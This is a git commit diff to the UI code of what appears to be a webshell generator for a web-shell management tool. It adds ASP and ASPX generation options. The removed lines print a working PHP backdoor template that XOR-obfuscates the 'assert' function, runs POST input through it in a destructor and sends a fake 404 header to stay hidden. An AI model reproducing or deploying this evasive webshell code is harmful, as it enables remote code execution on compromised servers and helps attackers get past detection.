64a8cba086a571b367438f842db34cf6bb95321e
Mr6 <46088090+yzddmr6@users.noreply.github.com>
2019-06-18 18:56:18 +0800

    Update ui.js

--- libs/ui.js
+++ libs/ui.js
@@ -43,8 +43,8 @@ class UI {
     toolbar.loadStruct([
       { type: 'buttonSelect', text: LANG['toolbar']['new'], icon: 'plus-circle', id: 'new', openAll: true,
       options: [
-        { id: 'asp',  icon: 'file-code-o', type: 'button', text: "ASP", enabled: false, }, // 暂不支持  asp aspx
-        { id: 'aspx', icon: 'file-code-o', type: 'button', text: "ASPX", enabled: false, },
+        { id: 'asp',  icon: 'file-code-o', type: 'button', text: "ASP" }, 
+        { id: 'aspx', icon: 'file-code-o', type: 'button', text: "ASPX"},
         { id: 'php',  icon: 'file-code-o', type: 'button', text: "PHP"},
       ]},
       { id: 'copy', type: 'button', text: LANG['toolbar']['copy'], icon: 'copy' },
@@ -109,34 +109,47 @@ class UI {
           }).then((data) => {
             if(data){
               self.editor.session.setMode(`ace/mode/php`);
-              let key = [0,0,0,0,0,0].map(t=>parseInt(Math.random() * 256));
-		let cipher = "assert".split("").map(t=>t.charCodeAt(0)).map((t, i)=> t ^ key[i]);
-		cipher = cipher.map(t=>"\\x" + t.toString(16));
-		key = key.map(t=>"\\x" + t.toString(16));
-		let lines = [0,1,2,3,4,5].map((t, i)=>`        $_${t} = "${cipher[i]}" ^ "${key[i]}";`).join("\r\n");
-		let name = [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random()*26) + t)).join("");
-let code = `<?php 
-header('HTTP/1.1 404');
-class ${name} { 
-    public $c='';
-    function __destruct() {
-${lines}
-        $db =${[0,1,2,3,4,5].map((t, i)=>`$_${t}`).join(".")};
-        return @$db($this->c);
-    }
-}
-$${name.toLowerCase()} = new ${name}();
-@$${name.toLowerCase()}->c = $_POST['${value}'];
-?>`
-              self.editor.session.setValue(code);
+              self.editor.session.setValue(`${data}`);
               toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
             }
           });
         });
         break
       case "asp":
+          layer.prompt({
+          value: "mr6",
+          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+        },(value, i, e) => {
+          layer.close(i);
+          callback({
+            type: "asp",
+            pwd: value,
+          }).then((data) => {
+            if(data){
+              self.editor.session.setMode(`ace/mode/php`);
+              self.editor.session.setValue(`${data}`);
+              toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+            }
+          });
+        });
         break
       case "aspx":
+                layer.prompt({
+          value: "mr6",
+          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+        },(value, i, e) => {
+          layer.close(i);
+          callback({
+            type: "aspx",
+            pwd: value,
+          }).then((data) => {
+            if(data){
+              self.editor.session.setMode(`ace/mode/php`);
+              self.editor.session.setValue(`${data}`);
+              toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+            }
+          });
+        });
         break
       case "copy":
         let saveData = self.editor.session.getValue();
@@ -159,7 +172,16 @@ $${name.toLowerCase()} = new ${name}();
       }
     });
   }
-
+  _randomStr(len){
+    len = len || 8;
+    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    let maxPos = chars.length;
+    let pwd = '';
+    for (var i = 0; i < len; i++) {
+      pwd += chars.charAt(Math.floor(Math.random() * maxPos));
+    }
+    return pwd;
+  }
 }
 
 module.exports = UI;
